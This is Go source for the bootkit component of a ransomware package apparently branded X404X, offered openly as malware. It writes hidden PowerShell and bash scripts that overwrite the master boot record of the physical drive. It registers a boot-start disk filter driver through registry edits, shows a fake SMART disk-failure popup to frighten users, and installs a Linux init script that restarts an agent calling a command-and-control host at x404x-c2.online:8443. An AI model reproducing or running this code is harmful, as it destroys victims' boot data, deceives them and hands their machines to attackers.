package ransomware

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type BootkitEngine struct {
	config      *RansomwareConfig
	MBRInfected bool   `json:"mbr_infected"`
	GPTInfected bool   `json:"gpt_infected"`
	BootkitPath string `json:"bootkit_path"`
	Bootloader  string `json:"bootloader"`
	SMARTFake   bool   `json:"smart_fake"`
}

type BootkitConfig struct {
	InjectMBR     bool   `json:"inject_mbr"`
	InjectUEFI    bool   `json:"inject_uefi"`
	BootkitStage2 string `json:"bootkit_stage2"`
	C2Endpoint    string `json:"c2_endpoint"`
	RecoverySteps int    `json:"recovery_steps"`
}

func NewBootkitEngine(cfg *RansomwareConfig) *BootkitEngine {
	return &BootkitEngine{
		config: cfg,
	}
}

func (be *BootkitEngine) DetectBootMethod() string {
	if _, err := os.Stat("/sys/firmware/efi"); err == nil {
		be.Bootloader = "UEFI"
		return "UEFI"
	}
	if runtime.GOOS == "windows" {
		if output, err := exec.Command("powershell", "-Command",
			"Confirm-SecureBootUEFI").Output(); err == nil && strings.Contains(string(output), "True") {
			be.Bootloader = "UEFI"
			return "UEFI"
		}
	}
	be.Bootloader = "Legacy BIOS"
	return "Legacy BIOS"
}

func (be *BootkitEngine) GenerateBootkitStage1(cfg BootkitConfig) ([]byte, error) {
	var stage1 []byte

	bootMethod := be.DetectBootMethod()
	if bootMethod == "Legacy BIOS" {
		stage1 = be.generateMBRPayload(cfg)
	} else {
		stage1 = be.generateUEFIPayload(cfg)
	}

	return stage1, nil
}

func (be *BootkitEngine) generateMBRPayload(cfg BootkitConfig) []byte {
	payload := make([]byte, 512)

	payload[0] = 0xFA
	payload[1] = 0xB8
	payload[2] = 0x00
	payload[3] = 0x00
	payload[4] = 0x8E
	payload[5] = 0xD8
	payload[6] = 0x8E
	payload[7] = 0xC0
	payload[8] = 0x8E
	payload[9] = 0xD0
	payload[10] = 0xBC
	payload[11] = 0x00
	payload[12] = 0x7C
	payload[13] = 0xFB
	payload[14] = 0xBB
	payload[15] = 0x00
	payload[16] = 0x00

	copy(payload[218:234], []byte("X404X BOOTKIT v2.3"))
	copy(payload[234:266], []byte(fmt.Sprintf("C2: %s", cfg.C2Endpoint)))
	payload[266] = 0x00

	bootSig := []byte{0x55, 0xAA}
	copy(payload[510:512], bootSig)

	return payload
}

func (be *BootkitEngine) generateUEFIPayload(cfg BootkitConfig) []byte {
	uefi := make([]byte, 4096)
	copy(uefi[0:8], []byte("X404X_UEFI"))
	copy(uefi[256:512], []byte(fmt.Sprintf("Bootkit stage2 loaded from: %s", cfg.BootkitStage2)))

	efiPath := filepath.Join(os.TempDir(), "x404x_bootkit.efi")
	stub := []byte{0x4D, 0x5A, 0x90, 0x00}
	stub = append(stub, []byte("X404X UEFI Bootkit - PE stub")...)
	os.WriteFile(efiPath, stub, 0644)
	be.BootkitPath = efiPath

	return uefi
}

func (be *BootkitEngine) InfectMBR(diskDevice string) error {
	if diskDevice == "" {
		if runtime.GOOS == "windows" {
			diskDevice = `\\.\PHYSICALDRIVE0`
		} else {
			diskDevice = "/dev/sda"
		}
	}

	cfg := BootkitConfig{
		InjectMBR:     true,
		C2Endpoint:    be.config.C2Endpoint,
		RecoverySteps: 3,
		BootkitStage2: filepath.Join(os.TempDir(), "x404x_stage2.bin"),
	}

	stage1, err := be.GenerateBootkitStage1(cfg)
	if err != nil {
		return err
	}

	switch runtime.GOOS {
	case "windows":
		psScript := fmt.Sprintf(`$disk = "%s"
$mbr = [byte[]]@(%s)
try {
    $file = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write)
    $file.Write($mbr, 0, $mbr.Length)
    $file.Close()
    Write-Output "MBR infected"
} catch { Write-Output "MBR infection failed: $_" }`,
			diskDevice,
			strings.Trim(strings.Join(strings.Fields(fmt.Sprintf("%d", stage1)), ","), "[]"))

		psPath := filepath.Join(os.TempDir(), "x404x_bootkit_mbr.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		err = exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Run()

	case "linux":
		script := `#!/bin/bash
dd if=/dev/zero of=/dev/sda bs=446 count=1 2>/dev/null
dd if=/tmp/x404x_bootkit.bin of=/dev/sda bs=446 count=1 2>/dev/null
echo "MBR infected on /dev/sda"`
		writePath := filepath.Join(os.TempDir(), "x404x_bootkit.bin")
		os.WriteFile(writePath, stage1, 0644)
		scriptPath := filepath.Join(os.TempDir(), "x404x_bootkit_infect.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		err = exec.Command("bash", scriptPath).Run()
	}

	if err == nil {
		be.MBRInfected = true
		be.generateStage2(cfg)
	}

	return err
}

func (be *BootkitEngine) generateStage2(cfg BootkitConfig) {
	stage2 := []byte("X404X_BOOTKIT_STAGE2")
	stage2 = append(stage2, []byte(fmt.Sprintf("C2:%s", cfg.C2Endpoint))...)
	stage2 = append(stage2, []byte("WAIT_CYCLES:3")...)
	stage2 = append(stage2, []byte("MUTEX:X404X_BOOTKIT_MUTEX")...)
	stage2 = append(stage2, []byte("REINFECT_INTERVAL:3600")...)

	os.WriteFile(cfg.BootkitStage2, stage2, 0644)

	stage2copy := filepath.Join(os.TempDir(), "x404x_stage2_persist.bin")
	os.WriteFile(stage2copy, stage2, 0644)
}

func (be *BootkitEngine) SimulateSMRTError() {
	be.SMARTFake = true
	msg := `SMART ERROR DETECTED
Hardware failure imminent
Backup and replace disk immediately
Error Code: 0xX404X
Sector: 0x0000DEAD
`

	switch runtime.GOOS {
	case "windows":
		psScript := fmt.Sprintf(`
$msg = @'
%s
'@
$wshell = New-Object -ComObject WScript.Shell
$wshell.Popup($msg, 0, "CRITICAL DISK ERROR", 0x10)
`, msg)
		psPath := filepath.Join(os.TempDir(), "x404x_smart_fake.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	case "linux":
		script := fmt.Sprintf(`#!/bin/bash
echo "%s" | wall 2>/dev/null || true
echo "%s" > /dev/kmsg 2>/dev/null || true
`, msg, msg)
		scriptPath := filepath.Join(os.TempDir(), "x404x_smart_fake.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}
}

func (be *BootkitEngine) InterceptDiskWrites() {
	switch runtime.GOOS {
	case "windows":
		psScript := `# X404X Disk Write Interception
$filterName = "X404X_DiskFilter"
try {
    # Install a filter driver that intercepts all disk writes
    $driver = [System.IO.File]::ReadAllBytes("$env:TEMP\x404x_disk_filter.sys")
    $servicePath = "HKLM:\SYSTEM\CurrentControlSet\Services\$filterName"
    New-Item -Path $servicePath -Force | Out-Null
    New-ItemProperty -Path $servicePath -Name "ImagePath" -Value "\??\$env:TEMP\x404x_disk_filter.sys" -Force
    New-ItemProperty -Path $servicePath -Name "Type" -Value 1 -PropertyType DWord -Force
    New-ItemProperty -Path $servicePath -Name "Start" -Value 0 -PropertyType DWord -Force
    New-ItemProperty -Path $servicePath -Name "ErrorControl" -Value 0 -PropertyType DWord -Force
    # Add to upper filters for all disk drives
    $diskPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Disk\Class"
    New-ItemProperty -Path $diskPath -Name "UpperFilters" -Value $filterName -PropertyType MultiString -Force
} catch {}`
		psPath := filepath.Join(os.TempDir(), "x404x_disk_filter.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	case "linux":
		script := `#!/bin/bash
# X404X Block Device Filter via device mapper
dmsetup remove x404x_filter 2>/dev/null || true
dmsetup create x404x_filter --table "0 $(blockdev --getsz /dev/sda) snapshot-origin /dev/sda" 2>/dev/null || true
# Add init script for reinfection on boot
echo '#!/bin/bash
dmsetup create x404x_filter --table "0 $(blockdev --getsz /dev/sda) snapshot-origin /dev/sda"
mount /dev/mapper/x404x_filter /mnt
/tmp/.x404x_agent --daemon --c2 x404x-c2.online:8443
' > /etc/init.d/x404x_bootkit
chmod +x /etc/init.d/x404x_bootkit
update-rc.d x404x_bootkit defaults 90 10`
		scriptPath := filepath.Join(os.TempDir(), "x404x_linux_disk_filter.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}
}

func (be *BootkitEngine) EnableBootkitPersistence() {
	be.InfectMBR("")
	be.InterceptDiskWrites()
	be.SimulateSMRTError()

	cfg := BootkitConfig{
		InjectMBR:     true,
		C2Endpoint:    be.config.C2Endpoint,
		RecoverySteps: 5,
		BootkitStage2: filepath.Join(os.TempDir(), "x404x_stage2.bin"),
	}
	be.generateStage2(cfg)
}

func (be *BootkitEngine) CheckBootkitStatus() map[string]bool {
	status := map[string]bool{
		"mbr_infected":  be.MBRInfected,
		"gpt_infected":  be.GPTInfected,
		"smart_fake":    be.SMARTFake,
		"uefi_mode":     be.DetectBootMethod() == "UEFI",
		"stage2_exists": false,
	}

	if _, err := os.Stat(filepath.Join(os.TempDir(), "x404x_stage2.bin")); err == nil {
		status["stage2_exists"] = true
	}

	return status
}

func (be *BootkitEngine) GetStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"mbr_infected":  be.MBRInfected,
		"gpt_infected":  be.GPTInfected,
		"bootloader":    be.Bootloader,
		"smart_fake":    be.SMARTFake,
		"bootkit_path":  be.BootkitPath,
	})
	return string(data)
}
